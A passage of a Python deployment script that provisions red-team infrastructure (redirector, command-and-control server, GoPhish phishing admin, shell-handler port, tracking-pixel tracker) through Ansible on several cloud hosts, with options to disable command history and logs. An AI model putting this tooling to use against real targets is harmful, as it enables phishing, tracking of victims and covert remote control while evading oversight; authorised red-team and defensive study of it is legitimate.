    default_zero_logs = vars_data.get(config['provider'], {}).get('zero_logs', True)
    
    disable_history = input(f"Disable command history? (y/n) [default: {'y' if default_disable_history else 'n'}]: ").lower()
    secure_memory = input(f"Enable secure memory settings? (y/n) [default: {'y' if default_secure_memory else 'n'}]: ").lower()
    zero_logs = input(f"Enable zero-logs configuration? (y/n) [default: {'y' if default_zero_logs else 'n'}]: ").lower()
    
    config['disable_history'] = True if (disable_history == 'y' or (default_disable_history and disable_history != 'n')) else False
    config['secure_memory'] = True if (secure_memory == 'y' or (default_secure_memory and secure_memory != 'n')) else False
    config['zero_logs'] = True if (zero_logs == 'y' or (default_zero_logs and zero_logs != 'n')) else False
    
    # Tracker configuration if enabled
    if config['deploy_tracker']:
        default_tracker_domain = f"track.{config['domain']}"
        config['tracker_domain'] = input(f"\nTracker domain [default: {default_tracker_domain}]: ") or default_tracker_domain
        
        default_tracker_email = config['letsencrypt_email']
        config['tracker_email'] = input(f"Tracker Let's Encrypt email [default: {default_tracker_email}]: ") or default_tracker_email
        
        config['tracker_ipinfo_token'] = input("IPinfo.io API token [optional]: ")
        config['tracker_setup_ssl'] = input("Set up SSL for tracker? (y/n) [default: y]: ").lower() != 'n'
        config['tracker_create_pixel'] = input("Create tracking pixel? (y/n) [default: y]: ").lower() != 'n'
    
    # Post-deployment options
    config['ssh_after_deploy'] = input("\nSSH into instance after deployment? (y/n) [default: y]: ").lower() == 'y'
    
    # Debug mode
    config['debug'] = input("Enable debug mode? (y/n) [default: n]: ").lower() == 'y'
    
    # Always generate a new SSH key using the deployment ID
    config['ssh_key'] = generate_ssh_key(deployment_id)
    
    # Generate instance names with consistent deployment ID
    config['redirector_name'] = f"r-{deployment_id}"
    config['c2_name'] = f"s-{deployment_id}"
    
    if config.get('deploy_tracker'):
        config['tracker_name'] = f"t-{deployment_id}"
    
    # Additional settings
    default_provider_vars = vars_data.get(config['provider'], {})
    config['gophish_admin_port'] = default_provider_vars.get('gophish_admin_port', str(random.randint(2000, 9000)))
    config['smtp_auth_user'] = default_provider_vars.get('smtp_auth_user', f"user{random.randint(1000, 9999)}")
    config['smtp_auth_pass'] = default_provider_vars.get('smtp_auth_pass', ''.join(random.choices(string.ascii_letters + string.digits, k=20)))
    config['shell_handler_port'] = default_provider_vars.get('shell_handler_port', str(random.randint(4000, 65000)))
    
    # Set up integrated tracker flag for deployment
    if config.get('deploy_tracker') and config.get('integrated_tracker'):
        config['setup_integrated_tracker'] = True
        
    # Set SSH key path for proper reference
    if config['ssh_key'].startswith(os.path.expanduser("~/.ssh/c2deploy_")):
        config['ssh_key_path'] = f"{config['ssh_key']}.pub"
    else:
        config['ssh_key_path'] = f"{config['ssh_key']}.pub"
        # Check if the public key exists
        if not os.path.exists(config['ssh_key_path']):
            # Try alternative extension
            alt_path = f"{config['ssh_key']}.pub"
            if os.path.exists(alt_path):
                config['ssh_key_path'] = alt_path
    
    print("\n========================================")
    print("Configuration Summary")
    print("========================================")
    for key, value in config.items():
        if key not in ['aws_secret_key', 'linode_token', 'smtp_auth_pass']:
            print(f"  {key}: {value}")
    
    confirm = input("\nProceed with deployment? (y/n): ").lower()
    if confirm != 'y':
        print("Deployment cancelled.")
        sys.exit(0)
    
    return config

def load_vars_file(provider):
    """Load vars.yaml for the specified provider"""
    if provider not in PROVIDER_DIRS:
        logging.warning(f"Unknown provider: {provider}")
        return {}
    
    # Use correct case for directory
    provider_dir = PROVIDER_DIRS[provider]
    vars_file = f"{provider_dir}/vars.yaml"
    
    if (os.path.exists(vars_file)):
        try:
            with open(vars_file, 'r') as f:
                vars_data = yaml.safe_load(f) or {}
                logging.info(f"Loaded configuration from {vars_file}")
                return vars_data
        except Exception as e:
            logging.warning(f"Failed to load {vars_file}: {e}")
    else:
        logging.warning(f"{vars_file} not found")
    
    return {}

def generate_ssh_key(deployment_id=None):
    """Generate an SSH key for deployment with proper tracking for cleanup"""
    # Use deployment_id if provided, otherwise generate random suffix
    if deployment_id:
        key_name = f"c2deploy_{deployment_id}"
    else:
        rand_suffix = generate_random_string()
        key_name = f"c2deploy_{rand_suffix}"
        
    ssh_dir = os.path.expanduser("~/.ssh")
    os.makedirs(ssh_dir, exist_ok=True)

    private_key_path = os.path.join(ssh_dir, key_name)
    public_key_path = f"{private_key_path}.pub"

    # Add key to global cleanup tracking dict if it doesn't exist
    if not hasattr(generate_ssh_key, 'generated_keys'):
        generate_ssh_key.generated_keys = set()
    
    generate_ssh_key.generated_keys.add(private_key_path)
    logging.info(f"Added {private_key_path} to cleanup tracking (total: {len(generate_ssh_key.generated_keys)})")

    logging.info(f"Generating SSH key: {key_name}")
    try:
        subprocess.run(
            ["ssh-keygen", "-t", "ed25519", "-f", private_key_path, "-N", "", "-C", ""],
            check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        os.chmod(private_key_path, 0o600)
        logging.info(f"SSH key generated successfully: {private_key_path}")
        return private_key_path
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to generate SSH key: {e}")
        return None

def select_regions(config, provider_vars, provider, use_multi_region=False, cross_provider=False):
    """Provider-agnostic region selection function"""
    # Determine which region key to use based on provider
    if provider == 'aws':
        region_key = 'aws_region_choices'
    elif provider == 'linode':
        region_key = 'region_choices'
    else:
        region_key = 'region_choices'
    
    # Get regions list
    regions = provider_vars.get(region_key, [])
    if not regions:
        print(f"No regions found for {provider}, using random selection")
        return
    
    # Show available regions
    print(f"\nAvailable {provider.capitalize()} regions:")
    for i, region in enumerate(regions, 1):
        print(f"  {i}. {region}")
    
    # Multi-region deployment
    if use_multi_region and not cross_provider:
        if not config.get('redirector_region'):
            redirector_region_input = input("\nSelect redirector region (number or leave blank for random): ")
            if redirector_region_input:
                try:
                    redirector_region_choice = int(redirector_region_input)
                    if 1 <= redirector_region_choice <= len(regions):
                        config['redirector_region'] = regions[redirector_region_choice - 1]
                    else:
                        print("Invalid choice, using random region for redirector")
                except ValueError:
                    print("Invalid input, using random region for redirector")
            else:
                print("Selecting random region for redirector")
                
        if not config.get('c2_region'):
            c2_region_input = input("Select C2 region (number or leave blank for random): ")
            if c2_region_input:
                try:
                    c2_region_choice = int(c2_region_input)
                    if 1 <= c2_region_choice <= len(regions):
                        config['c2_region'] = regions[c2_region_choice - 1]
                    else:
                        print("Invalid choice, using random region for C2")
                except ValueError:
                    print("Invalid input, using random region for C2")
            else:
                print("Selecting random region for C2")
                
    # Cross-provider deployment
    elif cross_provider:
        if provider == config.get('redirector_provider', config['provider']) and not config.get('redirector_region'):
            region_input = input("\nSelect region for redirector (number or leave blank for random): ")
            if region_input:
                try:
                    region_choice = int(region_input)
                    if 1 <= region_choice <= len(regions):
                        config['redirector_region'] = regions[region_choice - 1]
                    else:
                        print(f"Invalid choice, using random region")
                except ValueError:
                    print("Invalid input, using random region")
        
        if provider == config.get('c2_provider', config['provider']) and not config.get('c2_region'):
            region_input = input("\nSelect region for C2 (number or leave blank for random): ")
            if region_input:
                try:
                    region_choice = int(region_input)
                    if 1 <= region_choice <= len(regions):
                        config['c2_region'] = regions[region_choice - 1]
                    else:
                        print(f"Invalid choice, using random region")
                except ValueError:
                    print("Invalid input, using random region")
    
    # Single region deployment
    else:
        region_var = f"{provider}_region" if provider == 'aws' else 'linode_region' if provider == 'linode' else 'region'
        region_input = input("\nSelect region (number or leave blank for random): ")
        if region_input:
            try:
                region_choice = int(region_input)
                if 1 <= region_choice <= len(regions):
                    config[region_var] = regions[region_choice - 1]
                else:
                    print(f"Invalid choice, using random region")
            except ValueError:
                print("Invalid input, using random region")

def select_random_region(config):
    """Select a random region from the available regions for the provider"""
    provider = config['provider']
    
    region_choices = []
    if provider == "aws":
        region_choices = config.get("aws_region_choices", [])
    elif provider == "linode":
        # Look for both variations of the key name
        region_choices = config.get("region_choices", [])
        
        # Debug the vars_data content
        logging.debug(f"Linode config keys: {config.keys()}")
        
        if not region_choices:
            # Load directly from vars.yaml as fallback
            try:
                vars_file = "Linode/vars.yaml"
                if os.path.exists(vars_file):
                    with open(vars_file, 'r') as f:
                        vars_data = yaml.safe_load(f)
                        region_choices = vars_data.get('region_choices', [])
                        logging.debug(f"Loaded region_choices directly from {vars_file}: {region_choices}")
            except Exception as e:
                logging.warning(f"Failed to load regions from vars file: {e}")
    elif provider == "flokinet":
        region_choices = config.get("flokinet_region_choices", [])
    
    if not region_choices:
        logging.warning(f"No region choices found for {provider}")
        
        # Fallback regions by provider if none found in config
        if provider == "linode":
            region_choices = ["us-east", "us-central", "eu-west", "ap-south"]
            logging.info(f"Using fallback regions for Linode: {region_choices}")
    
    if not region_choices:
        return None
    
    # Select random region
    region = random.choice(region_choices)
    logging.info(f"Selected random {provider} region: {region}")
    return region

def create_consistent_resource_names(config):
    """Ensure all resources have consistent naming based on deployment ID"""
    deployment_id = config.get('deployment_id')
    if not deployment_id:
        logging.error("No deployment ID found in config")
        return config
    
    # Set consistent names for all resources
    config['redirector_name'] = f"r-{deployment_id}"
    config['c2_name'] = f"s-{deployment_id}"
    config['tracker_name'] = f"t-{deployment_id}"
    
    # Ensure SSH key follows same pattern with provider-specific extension
    if not config.get('ssh_key'):
        if config.get('provider') == 'aws':
            config['ssh_key'] = os.path.expanduser(f"~/.ssh/c2deploy_{deployment_id}.pem")
        else:
            config['ssh_key'] = os.path.expanduser(f"~/.ssh/c2deploy_{deployment_id}")
    
    # Set consistent public key path
    if config.get('ssh_key'):
        if config.get('provider') == 'aws' and not config['ssh_key'].endswith('.pem'):
            config['ssh_key'] = f"{config['ssh_key']}.pem"
        config['ssh_key_path'] = f"{config['ssh_key'].replace('.pem', '')}.pub"
        
    # Set other resource names with the same deployment ID
    config['vpc_name'] = f"vpc-{deployment_id}"
    config['sg_name'] = f"sg-{deployment_id}"
    
    logging.info(f"Set consistent resource names with deployment ID: {deployment_id}")
    return config

def create_inventory_file(config, deployment_type):
    """Create a temporary inventory file for Ansible based on deployment type"""
    inventory_content = []
    inventory_content.append("[all:vars]")
    
    # Add common variables
    if config.get('ssh_key'):
        inventory_content.append(f"ansible_ssh_private_key_file={config['ssh_key']}")
    if config.get('ssh_user'):
        inventory_content.append(f"ansible_user={config['ssh_user']}")
    if config.get('ssh_port'):
        inventory_content.append(f"ansible_port={config['ssh_port']}")
    
    # Set Python interpreter appropriately based on deployment type
    if deployment_type == "local":
        # For local execution, use the current Python interpreter
        inventory_content.append(f"ansible_python_interpreter={sys.executable}")
    else:
        # For remote hosts, use the system Python interpreter
        inventory_content.append("ansible_python_interpreter=/usr/bin/python3")
    
    # Add specific host sections based on deployment type
    if deployment_type == "local":
        inventory_content.append("\n[local]")
        inventory_content.append("localhost ansible_connection=local")
    elif deployment_type == "redirector":
        inventory_content.append("\n[redirectors]")
        inventory_content.append(f"redirector ansible_host={config.get('redirector_ip', '127.0.0.1')}")
    elif deployment_type == "c2":
        inventory_content.append("\n[c2servers]")
        inventory_content.append(f"c2 ansible_host={config.get('c2_ip', '127.0.0.1')}")
    elif deployment_type == "tracker":
        inventory_content.append("\n[trackers]")
        inventory_content.append(f"tracker ansible_host={config.get('tracker_ip', '127.0.0.1')}")
    
    # Create temporary file
    fd, inventory_path = tempfile.mkstemp(prefix=f"inventory_{deployment_type}_", suffix=".ini")
    with os.fdopen(fd, 'w') as f:
        f.write("\n".join(inventory_content))
    
    logging.debug(f"Created inventory file at {inventory_path} with content:")
    logging.debug("\n".join(inventory_content))
    
    return inventory_path

def run_ansible_playbook(playbook, inventory, config, debug=False):
    # Convert config dict to JSON for extra-vars
    extra_vars = {k: v for k, v in config.items() if v is not None and not isinstance(v, (dict, list, tuple))}
    
    # Ensure consistent region parameter handling
    if 'region' in extra_vars:
        extra_vars['selected_region'] = extra_vars['region']
    elif 'linode_region' in extra_vars:
        extra_vars['selected_region'] = extra_vars['linode_region']
        extra_vars['region'] = extra_vars['linode_region']  # Added for consistency
    
    extra_vars_json = json.dumps(extra_vars)
    
    # Set PYTHONPATH to include site-packages
    env = os.environ.copy()
    current_python = sys.executable
    python_path = subprocess.check_output(
        [current_python, "-c", "import sys; import site; print(':'.join(sys.path + site.getsitepackages()))"],
        text=True
    ).strip()
    env["PYTHONPATH"] = python_path
    
    # Build command with output JSON facts format
    cmd = [
        "ansible-playbook",
        "-i", inventory,
        playbook,
        "-e", extra_vars_json,
        "--extra-vars", "ansible_facts_callback=json"  # Get facts in JSON format
    ]
    
    # Add verbosity if debug mode is enabled - IMPORTANT CHANGE HERE
    if debug:
        cmd.append("-vvv")
        # Set ANSIBLE_STDOUT_CALLBACK for human-readable output
        env["ANSIBLE_STDOUT_CALLBACK"] = "debug"
    else:
        cmd.append("-v")
    
    # Log the command
    if debug:
        logging.debug(f"Running Ansible command: {' '.join(cmd)}")
    else:
        logging.info(f"Running Ansible playbook: {playbook}")
    
    # Run the command - MODIFIED TO DISPLAY OUTPUT IN REAL-TIME
    try:
        process = subprocess.Popen(
            cmd, 
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,  # Line buffered
            env=env
        )
        
        # Stream output in real-time
        stdout_output = []
        stderr_output = []
        
        # Create separate threads to read stdout and stderr
        def read_output(pipe, output_list, is_stdout=True):
            prefix = COLORS['GREEN'] if is_stdout else COLORS['RED']
            for line in iter(pipe.readline, ''):
                output_list.append(line)
                # Only print if debug mode is on or if it's an important message
                if debug or ('TASK' in line or 'PLAY' in line or 'changed=' in line or 'ok=' in line or 'failed=' in line):
                    print(f"{prefix}{line.rstrip()}{COLORS['RESET']}")
            pipe.close()
        
        from threading import Thread
        stdout_thread = Thread(target=read_output, args=(process.stdout, stdout_output, True))
        stderr_thread = Thread(target=read_output, args=(process.stderr, stderr_output, False))
        
        stdout_thread.daemon = True
        stderr_thread.daemon = True
        stdout_thread.start()
        stderr_thread.start()
        
        # Wait for process to complete
        return_code = process.wait()
        
        # Wait for output threads to complete
        stdout_thread.join()
        stderr_thread.join()
        
        # Join the output
        stdout_result = ''.join(stdout_output)
        stderr_result = ''.join(stderr_output)
        
        # Extract IP addresses from output
        if "C2 Server IP:" in stdout_result:
            ip_match = re.search(r"C2 Server IP: ([0-9.]+)", stdout_result)
            if ip_match:
                config['c2_ip'] = ip_match.group(1)
                logging.info(f"Extracted C2 IP: {config['c2_ip']}")
                
        if "Redirector IP:" in stdout_result:
            ip_match = re.search(r"Redirector IP: ([0-9.]+)", stdout_result)
            if ip_match:
                config['redirector_ip'] = ip_match.group(1)
                logging.info(f"Extracted Redirector IP: {config['redirector_ip']}")
        
        if return_code == 0:
            logging.info(f"Playbook {playbook} executed successfully")
            return True, stdout_result, stderr_result
        else:
            logging.error(f"Playbook {playbook} failed with exit code {return_code}")
            return False, stdout_result, stderr_result
    
    except Exception as e:
        logging.error(f"Error running playbook {playbook}: {e}")
        if debug:
            import traceback
            logging.error(traceback.format_exc())
        return False, "", str(e)

def deploy_infrastructure(config):
    """Deploy infrastructure based on provider and configuration"""
    # Ensure we have a deployment_id
    if 'deployment_id' not in config or not config['deployment_id']:
        config['deployment_id'] = generate_random_string(6)
        # Set up logging for this deployment
        log_file = setup_logging(config['deployment_id'], "deployment")
    
    provider = config['provider']
    logging.info(f"Deploying {provider} infrastructure...")
    
    try:
        # Set provider-specific environment variables
        if provider == "aws":
            if config.get('aws_access_key'):
                os.environ['AWS_ACCESS_KEY_ID'] = config['aws_access_key']
            if config.get('aws_secret_key'):
                os.environ['AWS_SECRET_ACCESS_KEY'] = config['aws_secret_key']
        elif provider == "linode":
            if config.get('linode_token'):
                os.environ['LINODE_TOKEN'] = config['linode_token']
        
        # Set correct ssh_user based on provider
        if not config.get('ssh_user'):
            config['ssh_user'] = DEFAULT_SSH_USER.get(provider, 'root')
        
        # Handle cross-provider deployment
        redirector_provider = config.get('redirector_provider', provider)
        c2_provider = config.get('c2_provider', provider)
        
        is_cross_provider = (redirector_provider != c2_provider) or \
                            (config.get('redirector_region') and config.get('c2_region') and \
                             config.get('redirector_region') != config.get('c2_region'))
        
        if is_cross_provider and not (config.get('redirector_only') or config.get('c2_only')):
            return deploy_cross_provider(config, redirector_provider, c2_provider)
        
        # For FlokiNET, validate required IPs
        if provider == "flokinet":
            if not config.get('c2_only') and not config.get('flokinet_redirector_ip') and not config.get('redirector_ip'):
                logging.error("FlokiNET redirector IP is required")
                return False
            
            if not config.get('redirector_only') and not config.get('flokinet_c2_ip') and not config.get('c2_ip'):
                logging.error("FlokiNET C2 IP is required")
                return False
        
        # Get correct provider directory
        provider_dir = PROVIDER_DIRS.get(provider, provider.capitalize())
        
        # Deploy redirector if needed
        if not config.get('c2_only'):
            redirector_config = config.copy()
            if config.get('redirector_region'):
                redirector_config['region'] = config['redirector_region']
                
            playbook = f"{provider_dir}/redirector.yml"
            inventory_path = create_inventory_file(redirector_config, "local")
            
            logging.info(f"Deploying {provider} redirector using {playbook} in region {redirector_config.get('region', 'default')}")
            redirector_success, stdout, stderr = run_ansible_playbook(
                playbook, inventory_path, redirector_config, redirector_config.get('debug', False)
            )
            
            if os.path.exists(inventory_path):
                os.unlink(inventory_path)
                
            if not redirector_success:
                logging.error(f"{provider} redirector deployment failed")
                if redirector_config.get('debug'):
                    logging.error(f"Ansible stderr: {stderr}")
                # Run cleanup before returning
                cleanup_resources(config, interactive=True)
                return False
                
            # Extract and save redirector IP for C2 configuration
            if 'redirector_ip' in redirector_config:
                config['redirector_ip'] = redirector_config['redirector_ip']
        
        # Deploy C2 if needed
        if not config.get('redirector_only'):
            c2_config = config.copy()
            if config.get('c2_region'):
                c2_config['region'] = config['c2_region']
                
            playbook = f"{provider_dir}/c2.yml"
            inventory_path = create_inventory_file(c2_config, "local")
            
            logging.info(f"Deploying {provider} C2 server using {playbook} in region {c2_config.get('region', 'default')}")
            c2_success, stdout, stderr = run_ansible_playbook(
                playbook, inventory_path, c2_config, c2_config.get('debug', False)
            )
            
            if os.path.exists(inventory_path):
                os.unlink(inventory_path)
                
            if not c2_success:
                logging.error(f"{provider} C2 server deployment failed")
                if c2_config.get('debug'):
                    logging.error(f"Ansible stderr: {stderr}")
                # Run cleanup before returning
                cleanup_resources(config, interactive=True)
                return False
                
            # Extract and save C2 IP for reference
            if 'c2_ip' in c2_config:
                config['c2_ip'] = c2_config['c2_ip']
        
        return True
    except Exception as e:
        logging.error(f"Deployment failed with error: {str(e)}")
        if config.get('debug'):
            import traceback
            logging.error(traceback.format_exc())
        
        # Clean up any partial resources that were created
        # Force interactive to False to ensure cleanup runs without prompting when there's an exception
        cleanup_resources(config, interactive=False)
        return False

def deploy_flokinet_redirector(config):
    """Deploy FlokiNET redirector separately"""
    logging.info("Deploying FlokiNET redirector...")
    
    # Verify redirector IP is provided
    if not config.get('flokinet_redirector_ip'):
        logging.error("FlokiNET redirector IP is required")
        return False
    
    # Set redirector_ip in config for inventory
    config['redirector_ip'] = config['flokinet_redirector_ip']
    
    # Create inventory file for redirector
    inventory_path = create_inventory_file(config, "redirector")
    
    # Run the playbook
    playbook = f"{PROVIDER_DIRS['flokinet']}/redirector.yml"
    try:
        success, stdout, stderr = run_ansible_playbook(
            playbook, inventory_path, config, config.get('debug', False)
        )
        
        # Clean up inventory file
        if os.path.exists(inventory_path):
            os.unlink(inventory_path)
        
        return success
    except Exception as e:
        logging.error(f"FlokiNET redirector deployment failed: {e}")
        
        # Clean up inventory file
        if os.path.exists(inventory_path):
            os.unlink(inventory_path)
        
        return False

def deploy_flokinet_c2(config):
    """Deploy FlokiNET C2 separately"""
    logging.info("Deploying FlokiNET C2 server...")
    
    # Verify C2 IP is provided
    if not config.get('flokinet_c2_ip'):
        logging.error("FlokiNET C2 IP is required")
        return False
    
    # Set c2_ip in config for inventory
    config['c2_ip'] = config['flokinet_c2_ip']
    
    # Create inventory file for C2
    inventory_path = create_inventory_file(config, "c2")
    
    # Run the playbook
    playbook = f"{PROVIDER_DIRS['flokinet']}/c2.yml"
    try:
        success, stdout, stderr = run_ansible_playbook(
            playbook, inventory_path, config, config.get('debug', False)
        )
        
        # Clean up inventory file
        if os.path.exists(inventory_path):
            os.unlink(inventory_path)
        
        return success
    except Exception as e:
        logging.error(f"FlokiNET C2 deployment failed: {e}")
        
        # Clean up inventory file
        if os.path.exists(inventory_path):
            os.unlink(inventory_path)
        
        return False

def run_tests(config):
    """Run deployment tests"""
    provider = config['provider']
    provider_dir = PROVIDER_DIRS.get(provider, provider.upper())
    
    logging.info(f"Running {provider} tests...")
    
    # Set provider-specific environment variables
    if provider == "aws":
        if config.get('aws_access_key'):
            os.environ['AWS_ACCESS_KEY_ID'] = config['aws_access_key']
        if config.get('aws_secret_key'):
            os.environ['AWS_SECRET_ACCESS_KEY'] = config['aws_secret_key']
    elif provider == "linode":
        if config.get('linode_token'):
            os.environ['LINODE_TOKEN'] = config['linode_token']
    
    # Run tests playbook
    playbook = f"{provider_dir}/tests.yml"
    if os.path.exists(playbook):
        inventory_path = create_inventory_file(config, "local")
        try:
            success, stdout, stderr = run_ansible_playbook(
                playbook, inventory_path, config, config.get('debug', False)
            )
            
            # Clean up inventory file
            if os.path.exists(inventory_path):
                os.unlink(inventory_path)
            
            return success
        except Exception as e:
            logging.error(f"Tests failed: {e}")
            
            # Clean up inventory file
            if os.path.exists(inventory_path):
                os.unlink(inventory_path)
            
            return False
    else:
        logging.warning(f"No tests playbook found at {playbook}")



def ssh_to_instance(config):
    """SSH into the deployed instance with improved AWS key handling"""
    logging.info("Connecting to instance via SSH...")
    
    # Determine which IP to use based on deployment type
    if config.get('redirector_only', False):
        ip_key = 'redirector_ip'
        instance_type = 'redirector'
    elif config.get('c2_only', False):
        ip_key = 'c2_ip'
        instance_type = 'C2 server'
    elif config.get('deploy_tracker', False) and not config.get('integrated_tracker', False):
        ip_key = 'tracker_ip'
        instance_type = 'tracker'
    else:
        # Default to C2 server for full deployments
        ip_key = 'c2_ip'
        instance_type = 'C2 server'
    
    # Use provider-specific IP
    ip = config.get(ip_key)
    
    if not ip:
        logging.error(f"No IP address found for {instance_type}")
        print(f"{COLORS['RED']}No IP address found for {instance_type}. Cannot SSH.{COLORS['RESET']}")
        return False
    
    # Get SSH key and user - with AWS-specific handling
    ssh_key = config.get('ssh_key')
    if config.get('provider') == 'aws':
        # For AWS, always look for the .pem extension key
        deployment_id = config.get('deployment_id', '')
        aws_key_path = os.path.expanduser(f"~/.ssh/c2deploy_{deployment_id}.pem")
        if os.path.exists(aws_key_path):
            ssh_key = aws_key_path
            logging.info(f"Using AWS key at {ssh_key}")
        else:
            # Try adding .pem to existing key path if it exists
            potential_pem_key = f"{ssh_key}.pem" if ssh_key else ""
            if potential_pem_key and os.path.exists(potential_pem_key):
                ssh_key = potential_pem_key
                logging.info(f"Found AWS key with .pem extension: {ssh_key}")
    
    if not ssh_key:
        logging.error("No SSH key specified")
        print(f"{COLORS['RED']}No SSH key specified. Cannot SSH.{COLORS['RESET']}")
        return False
    
    # Fix key permissions
    os.chmod(ssh_key, 0o600)
    
    # Try multiple possible usernames
    if config.get('ssh_user'):
        ssh_users = [config.get('ssh_user')]
    elif config['provider'] == 'aws':
        # For AWS, try multiple common usernames
        ssh_users = ['kali', 'ec2-user', 'ubuntu', 'root']
    elif config['provider'] == 'linode':
        ssh_users = ['root']
    else:
        ssh_users = [DEFAULT_SSH_USER.get(config['provider'], 'root')]
    
    # Print SSH connection information
    print(f"\n{COLORS['CYAN']}SSH Connection Information:{COLORS['RESET']}")
    print(f"  Host: {ip}")
    print(f"  Key:  {ssh_key}")
    print(f"  Will try users: {', '.join(ssh_users)}")
    
    # Try each SSH user until one works
    for ssh_user in ssh_users:
        print(f"\n{COLORS['YELLOW']}Trying SSH with user: {ssh_user}{COLORS['RESET']}")
        print(f"  Manual SSH command: ssh -i {ssh_key} {ssh_user}@{ip}")
        
        # Build SSH command
        ssh_cmd = [
            "ssh",
            "-t",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "IdentitiesOnly=yes",
            "-o", "ConnectTimeout=10",
            "-i", ssh_key,
            f"{ssh_user}@{ip}"
        ]
        
        # Execute SSH command with timeout
        try:
            subprocess.run(ssh_cmd, timeout=60)
            return True
        except subprocess.TimeoutExpired:
            print(f"{COLORS['YELLOW']}Connection with user {ssh_user} timed out, trying next user...{COLORS['RESET']}")
            continue
        except Exception as e:
            print(f"{COLORS['YELLOW']}Connection with user {ssh_user} failed: {e}{COLORS['RESET']}")
            continue
    
    print(f"{COLORS['RED']}Failed to connect with any user. Check instance security group and key.{COLORS['RESET']}")
    return False

def cleanup_resources(config, interactive=True):
    """Clean up resources if deployment fails"""
    provider = config.get('provider')
    logging.info(f"Cleaning up {provider} resources...")
    
    # Use the correct case for provider directory
    provider_dir = PROVIDER_DIRS.get(provider, provider.upper())
    
    # Load credentials from vars.yaml if they're not already in the config
    if provider == "aws" and not (config.get('aws_access_key') and config.get('aws_secret_key')):
        try:
            vars_file = f"{provider_dir}/vars.yaml"
            if os.path.exists(vars_file):
                with open(vars_file, 'r') as f:
                    vars_data = yaml.safe_load(f) or {}
                config['aws_access_key'] = vars_data.get('aws_access_key')
                config['aws_secret_key'] = vars_data.get('aws_secret_key')
                logging.info("Loaded AWS credentials from vars.yaml for cleanup")
        except Exception as e:
            logging.warning(f"Failed to load AWS credentials from vars file: {e}")
            
    elif provider == "linode" and not config.get('linode_token'):
        try:
            vars_file = f"{provider_dir}/vars.yaml"
            if os.path.exists(vars_file):
                with open(vars_file, 'r') as f:
                    vars_data = yaml.safe_load(f) or {}
                config['linode_token'] = vars_data.get('linode_token')
                logging.info("Loaded Linode token from vars.yaml for cleanup")
        except Exception as e:
            logging.warning(f"Failed to load Linode token from vars file: {e}")
    
    # Set provider-specific environment variables for cleanup
    if provider == "aws":
        if config.get('aws_access_key'):
            os.environ['AWS_ACCESS_KEY_ID'] = config['aws_access_key']
        if config.get('aws_secret_key'):
            os.environ['AWS_SECRET_ACCESS_KEY'] = config['aws_secret_key']
    elif provider == "linode":
        if config.get('linode_token'):
            os.environ['LINODE_TOKEN'] = config['linode_token']
    
    # If interactive, ask for confirmation before cleaning up
    if interactive:
        print("\n============================================================")
        print("Deployment failed or was interrupted. Resources to clean up:")
        redirector_name = config.get('redirector_name', 'None')
        c2_name = config.get('c2_name', 'None')
        tracker_name = config.get('tracker_name', 'None')
        print(f" - Redirector: {redirector_name}")
        print(f" - C2 Server: {c2_name}")
        if config.get('deploy_tracker') and not config.get('integrated_tracker'):
            print(f" - Tracker: {tracker_name}")
        print("============================================================")
        
        try:
            user_choice = input("\nDo you want to clean up these resources? (y/n): ").lower()
            if user_choice != 'y':
                logging.info("Cleanup cancelled by user")
                print("\nCleanup cancelled. Resources remain active.")
                print("You can clean them up later by running with --teardown")
                return False
        except KeyboardInterrupt:
            # Handle if the user presses Ctrl+C during input
            print("\nCleanup cancelled. Resources remain active.")
            print("You can clean them up later by running with --teardown")
            return False
    
    # Clean up SSH keys
    if 'deployment_id' in config:
        ssh_key_path = f"~/.ssh/c2deploy_{config['deployment_id']}.pem"
        expanded_path = os.path.expanduser(ssh_key_path)
        if os.path.exists(expanded_path):
            try:
                os.remove(expanded_path)
                logging.info(f"Removed SSH key: {ssh_key_path}")
            except Exception as e:
                logging.error(f"Failed to remove SSH key {ssh_key_path}: {e}")
                
        # Also check for public key
        pub_key_path = f"{expanded_path}.pub"
        if os.path.exists(pub_key_path):
            try:
                os.remove(pub_key_path)
                logging.info(f"Removed SSH public key: {pub_key_path}.pub")
            except Exception as e:
                logging.error(f"Failed to remove SSH public key {pub_key_path}.pub: {e}")
    
    # Use Ansible for cleanup with confirmation set to false
    extra_vars = {
        "confirm_cleanup": False,  # Skip confirmation prompt
        "redirector_name": config.get('redirector_name'),
        "c2_name": config.get('c2_name'),
        "tracker_name": config.get('tracker_name'),
        "cleanup_redirector": True,
        "cleanup_c2": True,
        "cleanup_tracker": config.get('deploy_tracker', False) and not config.get('integrated_tracker', False)
    }
    
    playbook = f"{provider_dir}/cleanup.yml"
    if os.path.exists(playbook):
        logging.info(f"Running cleanup playbook: {playbook}")
        inventory_path = create_inventory_file(config, "local")
        
        # Add extra vars to config for cleanup
        cleanup_config = config.copy()
        cleanup_config.update(extra_vars)
        
        try:
            success, stdout, stderr = run_ansible_playbook(
                playbook, inventory_path, cleanup_config, 
                cleanup_config.get('debug', False)
            )
            
            if not success:
                logging.error(f"Cleanup playbook failed: {stderr}")
                
                # Log what we attempted to clean up
                logging.error(f"Failed to clean up resources: redirector={config.get('redirector_name')}, c2={config.get('c2_name')}, tracker={config.get('tracker_name')}")
            else:
                logging.info("Cleanup completed successfully")
        except Exception as e:
            logging.error(f"Cleanup playbook failed: {e}")
        finally:
            if os.path.exists(inventory_path):
                os.unlink(inventory_path)
    else:
        logging.warning(f"No cleanup playbook found at {playbook}")
    
    # Clean up SSH key if we generated one
    ssh_key = config.get('ssh_key')
    if ssh_key and ssh_key.startswith(os.path.expanduser("~/.ssh/c2deploy_")):
        logging.info(f"Removing generated SSH key: {ssh_key}")
        try:
            os.remove(ssh_key)
            if os.path.exists(f"{ssh_key}.pub"):
                os.remove(f"{ssh_key}.pub")
        except Exception as e:
            logging.error(f"Failed to remove SSH key: {e}")
            
    return True


def check_dependencies():
    """Check if required dependencies are installed"""
    dependencies = {
        "ansible": "ansible-playbook --version",
        "aws": "aws --version",
        "linode-cli": "linode-cli --version",
    }
    
    missing = []
    for dep, cmd in dependencies.items():
        try:
            subprocess.run(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            missing.append(dep)
    
    if missing:
        logging.warning(f"Missing dependencies: {', '.join(missing)}")
        print("\nWarning: The following dependencies are missing or not in PATH:")
        for dep in missing:
            print(f"  - {dep}")
